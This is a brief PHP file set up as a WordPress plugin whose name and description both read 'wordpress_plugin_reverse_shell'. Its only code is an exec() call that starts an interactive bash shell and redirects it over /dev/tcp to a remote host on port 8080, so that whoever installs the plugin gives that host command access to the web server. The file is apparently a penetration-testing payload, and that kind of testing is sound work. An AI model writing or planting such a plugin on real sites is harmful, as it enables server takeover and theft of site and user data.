<?php

/**
 * Plugin Name: wordpress_plugin_reverse_shell
 * Plugin URI: 
 * Description: wordpress_plugin_reverse_shell
 * Version: 1.0
 * Author: this test
 * Author URI: https://github.com/arm72
 */

exec("/bin/bash -c 'bash -i 2>&1 /dev/tcp/192.168.0.1/8080 0>&1'");

?>
